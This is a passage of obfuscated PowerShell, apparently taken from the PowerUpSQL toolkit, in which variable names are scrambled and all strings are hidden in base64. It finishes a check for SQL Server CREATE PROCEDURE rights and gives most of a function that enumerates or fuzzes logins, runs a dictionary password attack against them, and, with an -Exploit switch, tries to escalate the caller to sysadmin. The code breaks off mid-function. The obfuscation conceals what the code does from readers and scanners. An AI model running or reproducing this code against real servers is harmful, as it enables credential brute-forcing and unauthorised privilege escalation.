        ${____/\__/===\/===}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBmACAAdABoAGUAIABwAGUAcgBtAGkAcwBzAGkAbwBuACAAaQBzACAAbgBvAHQAIAByAGUAcQB1AGkAcgBlAGQAIAByAGUAbQBvAHYAZQAgAGkAdAAuACAAIABQAGUAcgBtAGkAcwBzAGkAbwBuAHMAIABhAHIAZQAgAGcAcgBhAG4AdABlAGQAIAB3AGkAdABoACAAYQAgAGMAbwBtAG0AYQBuAGQAIABsAGkAawBlADoAIABHAFIAQQBOAFQAIABDAFIARQBBAFQARQAgAFAAUgBPAEMARQBEAFUAUgBFACAAVABPACAAdQBzAGUAcgAsACAAYQBuAGQAIABjAGEAbgAgAGIAZQAgAHIAZQBtAG8AdgBlAGQAIAB3AGkAdABoACAAYQAgAGMAbwBtAG0AYQBuAGQAIABsAGkAawBlADoAIABSAEUAVgBPAEsARQAgAEMAUgBFAEEAVABFACAAUABSAE8AQwBFAEQAVQBSAEUAIABUAE8AIAB1AHMAZQByAA==')))
        ${/=\_/=\_/=\_/\/=\}      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGQAaQB1AG0A')))
        ${____/=\_/=\___/=\}  = 'No'
        ${___/=\/=\_/=\_/==} = 'No'
        ${__/\/\_/==\/==\/\}     = 'No'
        ${_____/\/========\}    = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAZQB4AHAAbABvAGkAdAAgAGkAcwAgAGMAdQByAHIAZQBuAHQAbAB5ACAAYQB2AGEAaQBsAGEAYgBsAGUAIAB0AGgAYQB0ACAAdwBpAGwAbAAgAGEAbABsAG8AdwAgACQAewAvAD0AXABfAC8APQA9AFwAXwBfAC8AXAAvAFwAXwAvAD0AfQAgAHQAbwAgAGIAZQBjAG8AbQBlACAAYQAgAHMAeQBzAGEAZABtAGkAbgAuAA==')))
        ${/=\/=\_/\/\/\/\_/}       = ''
        ${_/=\_/==\_/\/==\/} = ''
        ${______/=\/==\/===}     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AcwBkAG4ALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AZQBuAC0AdQBzAC8AbABpAGIAcgBhAHIAeQAvAG0AcwAxADgANwA5ADIANgAuAGEAcwBwAHgAPwBmAD0AMgA1ADUAJgBNAFMAUABQAEUAcgByAG8AcgA9AC0AMgAxADQANwAyADEANwAzADkANgA=')))
        ${_/\____/\/==\/\/\}        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        ${/=\/\_/=\/\/\_/\/} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -SuppressVerbose | Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PermissionName $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAEUAQQBUAEUAIABQAFIATwBDAEUARABVAFIARQA=')))
        if(${/=\/\_/=\/\/\_/\/})
        {
            ${___/\/\/=\/=\_/=\}|
            % -Process {
                ${_/===\_/=\/==\__/} = $_
                ${/=\/\_/=\/\/\_/\/} |
                % -Process {
                    ${/=\/\_/==\/\/\_/\} = $_.PrincipalName
                    ${_/===\_/\___/===\} = $_.DatabaseName
                    if(${/=\/\_/==\/\/\_/\} -eq ${_/===\_/=\/==\__/})
                    {
                        ${____/=\_/=\___/=\}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAFQAaABlACAAJAB7AC8APQBcAC8AXABfAC8APQA9AFwALwBcAC8AXABfAC8AXAB9ACAAcAByAGkAbgBjAGkAcABhAGwAIABoAGEAcwAgAHQAaABlACAAQwBSAEUAQQBUAEUAIABQAFIATwBDAEUARABVAFIARQAgAHAAZQByAG0AaQBzAHMAaQBvAG4AIABpAG4AIAB0AGgAZQAgACQAewBfAC8APQA9AD0AXABfAC8AXABfAF8AXwAvAD0APQA9AFwAfQAgAGQAYQB0AGEAYgBhAHMAZQAuAA==')))
                        ${/=\/=\_/\/\/\/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIAAkAHsALwA9AFwALwBcAF8ALwA9AD0AXAAvAFwALwBcAF8ALwBcAH0AIABwAHIAaQBuAGMAaQBwAGEAbAAgAGgAYQBzACAAdABoAGUAIABDAFIARQBBAFQARQAgAFAAUgBPAEMARQBEAFUAUgBFACAAcABlAHIAbQBpAHMAcwBpAG8AbgAgAGkAbgAgAHQAaABlACAAJAB7AF8ALwA9AD0APQBcAF8ALwBcAF8AXwBfAC8APQA9AD0AXAB9ACAAZABhAHQAYQBiAGEAcwBlAC4A')))
                        ${/=\/\__/\__/\/\/=} = Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PermissionName $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBMAFQARQBSAA=='))) -PermissionType $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBDAEgARQBNAEEA'))) -PrincipalName ${_/===\_/=\/==\__/} -DatabaseName ${_/===\_/\___/===\}  -SuppressVerbose
                        if(${/=\/\__/\__/\/\/=})
                        {
                            ${___/=\/=\_/=\_/==} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                            ${_/=\_/==\_/\/==\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAkAHsAXwAvAD0APQA9AFwAXwAvAD0AXAAvAD0APQBcAF8AXwAvAH0AIABhAGwAcwBvACAAaABhAHMAIABBAEwAVABFAFIAIABTAEMASABFAE0AQQAgAHAAZQByAG0AaQBzAHMAaQBvAG4AcwAgAHMAbwAgAHAAcgBvAGMAZQBkAHUAcgBlAHMAIABjAGEAbgAgAGIAZQAgAGMAcgBlAGEAdABlAGQALgA=')))
                            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEQAZQBwAGUAbgBkAGEAbgBjAGkAZQBzACAAdwBlAHIAZQAgAG0AZQB0ADoAIAAkAHsAXwAvAD0APQA9AFwAXwAvAD0AXAAvAD0APQBcAF8AXwAvAH0AIABoAGEAcwAgAEEATABUAEUAUgAgAFMAQwBIAEUATQBBACAAcABlAHIAbQBpAHMAcwBpAG8AbgBzAC4A')))
                            $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${/=\/====\_/\/===\}, ${__/\/\_______/==\}, ${____/\__/===\/===}, ${/=\_/=\_/=\_/\/=\}, ${____/=\_/=\___/=\}, ${___/=\/=\_/=\_/==}, ${__/\/\_/==\/==\/\}, ${_____/\/========\}, $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAC8APQBcAF8ALwBcAC8AXAAvAFwALwBcAF8ALwB9ACQAewBfAC8APQBcAF8ALwA9AD0AXABfAC8AXAAvAD0APQBcAC8AfQA='))), ${______/=\/==\/===}, ${_/\____/\/==\/\/\})
                        }
                        else
                        {
                            ${___/=\/=\_/=\_/==} = 'No'
                            $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${/=\/====\_/\/===\}, ${__/\/\_______/==\}, ${____/\__/===\/===}, ${/=\_/=\_/=\_/\/=\}, ${____/=\_/=\___/=\}, ${___/=\/=\_/=\_/==}, ${__/\/\_/==\/==\/\}, ${_____/\/========\}, ${/=\/=\_/\/\/\/\_/}, ${______/=\/==\/===}, ${_/\____/\/==\/\/\})
                        }
                        if($Exploit -and ${___/=\/=\_/=\_/==} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                        {
                            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAE4AbwAgAHMAZQByAHYAZQByACAAZQBzAGMAYQBsAGEAdABpAG8AbgAgAG0AZQB0AGgAbwBkACAAaQBzACAAYQB2AGEAaQBsAGEAYgBsAGUAIABhAHQAIAB0AGgAaQBzACAAdABpAG0AZQAuAA==')))
                        }
                    }
                }
            }
        }
        else
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAFQAaABlACAAYwB1AHIAcgBlAG4AdAAgAGwAbwBnAGkAbgAgAGQAbwBlAHMAbgAnAHQAIABoAGEAdgBlACAAdABoAGUAIABDAFIARQBBAFQARQAgAFAAUgBPAEMARQBEAFUAUgBFACAAcABlAHIAbQBpAHMAcwBpAG8AbgAgAGkAbgAgAGEAbgB5ACAAZABhAHQAYQBiAGEAcwBlAHMALgA=')))
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABQAEUAUgBNAEkAUwBTAEkATwBOACAALQAgAEMAUgBFAEEAVABFACAAUABSAE8AQwBFAEQAVQBSAEUA')))
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return ${_/=\/\_/=====\/\_}
        }
    }
}
Function Invoke-SQLAuditWeakLoginPw
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Known SQL Server login to fuzz logins with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Username to test.')]
        [string]$TestUsername = 'sa',
        [Parameter(Mandatory = $false,
        HelpMessage = 'Path to list of users to use.  One per line.')]
        [string]$UserFile,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Known SQL Server password to fuzz logins with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server password to attempt to login with.')]
        [string]$TestPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Path to list of passwords to use.  One per line.')]
        [string]$PassFile,
        [Parameter(Mandatory = $false,
        HelpMessage = 'User is tested as pass by default. This setting disables it.')]
        [switch]$NoUserAsPass,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't attempt to enumerate logins from the server.")]
        [switch]$NoUserEnum,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of Principal IDs to fuzz.')]
        [string]$FuzzNum = 10000,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [switch]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        ${_/=\/\_/=====\/\_} = New-Object -TypeName System.Data.DataTable
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBUAEEAUgBUACAAVgBVAEwATgBFAFIAQQBCAEkATABJAFQAWQAgAEMASABFAEMASwA6ACAAVwBlAGEAawAgAEwAbwBnAGkAbgAgAFAAYQBzAHMAdwBvAHIAZAA=')))
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not ${__/\_/=\/==\_/=\_})
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAEYAQQBJAEwARQBEAC4A')))
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABXAGUAYQBrACAATABvAGcAaQBuACAAUABhAHMAcwB3AG8AcgBkAC4A')))
            Return
        }
        else
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAFMAVQBDAEMARQBTAFMALgA=')))
        }
        ${_/==\_/==\___/\_/} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${/=\_/==\__/\/\_/=} = ${_/==\_/==\___/\_/}.CurrentLogin
        $ComputerName = ${_/==\_/==\___/\_/}.ComputerName
        ${/=\/===\__/=\/=\_} = ${_/==\_/==\___/\_/}.IsSysadmin
        if($Exploit)
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        ${/=\/====\_/\/===\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBlAGEAawAgAEwAbwBnAGkAbgAgAFAAYQBzAHMAdwBvAHIAZAA=')))
        ${__/\/\_______/==\}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBuAGUAIABvAHIAIABtAG8AcgBlACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAGwAbwBnAGkAbgBzACAAaQBzACAAYwBvAG4AZgBpAGcAdQByAGUAZAAgAHcAaQB0AGgAIABhACAAdwBlAGEAawAgAHAAYQBzAHMAdwBvAHIAZAAuACAAIABUAGgAaQBzACAAbQBhAHkAIABwAHIAbwB2AGkAZABlACAAdQBuAGEAdQB0AGgAbwByAGkAegBlAGQAIABhAGMAYwBlAHMAcwAgAHQAbwAgAHIAZQBzAG8AdQByAGMAZQBzACAAdABoAGUAIABhAGYAZgBlAGMAdABlAGQAIABsAG8AZwBpAG4AcwAgAGgAYQB2AGUAIABhAGMAYwBlAHMAcwAgAHQAbwAuAA==')))
        ${____/\__/===\/===}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHMAdQByAGUAIABhAGwAbAAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABsAG8AZwBpAG4AcwAgAGEAcgBlACAAcgBlAHEAdQBpAHIAZQBkACAAdABvACAAdQBzAGUAIABhACAAcwB0AHIAbwBuAGcAIABwAGEAcwBzAHcAbwByAGQALgAgAEMAbwBuAHMAaQBkAGUAcgAgAGkAbgBoAGUAcgBpAHQAaQBuAGcAIAB0AGgAZQAgAE8AUwAgAHAAYQBzAHMAdwBvAHIAZAAgAHAAbwBsAGkAYwB5AC4A')))
        ${/=\_/=\_/=\_/\/=\}      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaAA=')))
        ${____/=\_/=\___/=\}  = 'No'
        ${___/=\/=\_/=\_/==} = 'No'
        ${__/\/\_/==\/==\/\}     = 'No'
        ${_____/\/========\}    = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAIAB0AGgAZQAgAGEAZgBmAGUAYwB0AGUAZAAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAHQAbwAgAGwAbwBnACAAaQBuAHQAbwAgAHQAaABlACAAUwBRAEwAIABTAGUAcgB2AGUAcgAsACAAbwByACAAcgBlAHIAdQBuACAAdABoAGkAcwAgAGMAbwBtAG0AYQBuAGQAIAB3AGkAdABoACAALQBFAHgAcABsAG8AaQB0AC4A')))
        ${/=\/=\_/\/\/\/\_/}       = ''
        ${______/=\/==\/===}     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AcwBkAG4ALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AZQBuAC0AdQBzAC8AbABpAGIAcgBhAHIAeQAvAG0AcwAxADYAMQA5ADUAOQAuAGEAcwBwAHgA')))
        ${_/\____/\/==\/\/\}        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        ${____/=\__/=\/===\} = @()
        ${/\_______/\_/\/\/} = @()
        if($UserFile)
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAGwAbwBnAGkAbgBzACAAZgByAG8AbQAgAGYAaQBsAGUALgAuAC4A')))
            gc -Path $UserFile |
            % -Process {
                ${____/=\__/=\/===\} += $_
            }
        }
        if($TestUsername)
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAHMAdQBwAHAAbABpAGUAZAAgAGwAbwBnAGkAbgAuAC4ALgA=')))
            ${____/=\__/=\/===\} += $TestUsername
        }
        if(-not $NoUserEnum)
        {
            ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
                $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
            }
            if(${__/\_/=\/==\_/=\_})
            {
                ${__/\/==\____/\_/=} = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
                if(${__/\/==\____/\_/=} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAGwAaQBzAHQAIABvAGYAIABsAG8AZwBpAG4AcwAuAC4ALgA=')))
                    Get-SQLServerLogin -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose |
                    ? -FilterScript {
                        $_.PrincipalType -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAXwBMAE8ARwBJAE4A')))
                    } |
                    select -Property PrincipalName -ExpandProperty PrincipalName |
                    % -Process {
                        ${____/=\__/=\/===\} += $_
                    }
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAHUAbQBlAHIAYQB0AGkAbgBnACAAcAByAGkAbgBjAGkAcABhAGwAIABuAGEAbQBlAHMAIABmAHIAbwBtACAAJABGAHUAegB6AE4AdQBtACAAcAByAGkAbgBjAGkAcABhAGwAIABJAEQAcwAuAC4A')))
                    Get-SQLFuzzServerLogin -Instance $Instance -GetPrincipalType -Username $Username -Password $Password -Credential $Credential -FuzzNum $FuzzNum -SuppressVerbose |
                    ? -FilterScript {
                        $_.PrincipleType -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAIABMAG8AZwBpAG4A')))
                    } |
                    select -Property PrincipleName -ExpandProperty PrincipleName |
                    % -Process {
                        ${____/=\__/=\/===\} += $_
                    }
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkACAALQAgAEMAbwB1AGwAZAAgAG4AbwB0ACAAYQB1AHQAaABlAG4AdABpAGMAYQB0AGUAIAB3AGkAdABoACAAcAByAG8AdgBpAGQAZQBkACAAYwByAGUAZABlAG4AdABpAGEAbABzAC4A')))
                }
                return
            }
        }
        if(${____/=\__/=\/===\}.count -eq 0 -and (-not $FuzzLogins))
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAATgBvACAAbABvAGcAaQBuAHMAIABoAGEAdgBlACAAYgBlAGUAbgAgAHAAcgBvAHYAaQBkAGUAZAAuAA==')))
            return
        }
        if($PassFile)
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAHAAYQBzAHMAdwBvAHIAZAAgAGYAcgBvAG0AIABmAGkAbABlAC4ALgAuAA==')))
            gc -Path $PassFile |
            % -Process {
                ${/\_______/\_/\/\/} += $_
            }
        }
        if($TestPassword)
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARwBlAHQAdABpAG4AZwAgAHMAdQBwAHAAbABpAGUAZAAgAHAAYQBzAHMAdwBvAHIAZAAuAC4ALgA=')))
            ${/\_______/\_/\/\/} += $TestPassword
        }
        if(${/\_______/\_/\/\/}.count -eq 0 -and ($NoUserAsPass))
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAATgBvACAAcABhAHMAcwB3AG8AcgBkAHMAIABoAGEAdgBlACAAYgBlAGUAbgAgAHAAcgBvAHYAaQBkAGUAZAAuAA==')))
            return
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAAUABlAHIAZgBvAHIAbQBpAG4AZwAgAGQAaQBjAHQAaQBvAG4AYQByAHkAIABhAHQAdABhAGMAawAuAC4ALgA=')))
        ${____/=\__/=\/===\} |
        select -Unique |
        % -Process {
            ${__/\/===\/==\__/=} = $_
            ${/\_______/\_/\/\/} |
            select -Unique |
            % -Process {
                ${__/\___/==\/\_/\/} = $_
                ${_/======\_____/\_} = Get-SQLConnectionTest -Instance $Instance -Username ${__/\/===\/==\__/=} -Password ${__/\___/==\/\_/\/} -SuppressVerbose |
                ? -FilterScript {
                    $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
                }
                if(${_/======\_____/\_})
                {
                    ${__/\/==\____/\_/=} = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username ${__/\/===\/==\__/=} -Password ${__/\___/==\/\_/\/} -SuppressVerbose |
                    select -Property IsSysadmin -ExpandProperty IsSysadmin
                    if(${__/\/==\____/\_/=} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                    {
                        ${__/=\/=\/\_/\____} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAYQBkAG0AaQBuAA==')))
                    }
                    else
                    {
                        ${__/=\/=\/\_/\____} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABTAHkAcwBhAGQAbQBpAG4A')))
                    }
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAAUwB1AGMAYwBlAHMAcwBmAHUAbAAgAEwAbwBnAGkAbgA6ACAAVQBzAGUAcgAgAD0AIAAkAHsAXwBfAC8AXAAvAD0APQA9AFwALwA9AD0AXABfAF8ALwA9AH0AIAAoACQAewBfAF8ALwA9AFwALwA9AFwALwBcAF8ALwBcAF8AXwBfAF8AfQApACAAUABhAHMAcwB3AG8AcgBkACAAPQAgACQAewBfAF8ALwBcAF8AXwBfAC8APQA9AFwALwBcAF8ALwBcAC8AfQA=')))
                    if($Exploit)
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAAVAByAHkAaQBuAGcAIAB0AG8AIABtAGEAawBlACAAeQBvAHUAIABhACAAcwB5AHMAYQBkAG0AaQBuAC4ALgAuAA==')))
                        ${_/\/\_/\_/==\/\/=} = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
                        select -Property IsSysadmin -ExpandProperty IsSysadmin
                        if(${_/\/\_/\_/==\/\/=} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                        {
                            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAAWQBvAHUAJwByAGUAIABhAGwAcgBlAGEAZAB5ACAAYQAgAHMAeQBzAGEAZABtAGkAbgAuACAATgBvAHQAaABpAG4AZwAgAHQAbwAgAGQAbwAuAA==')))
                        }
                        else
                        {
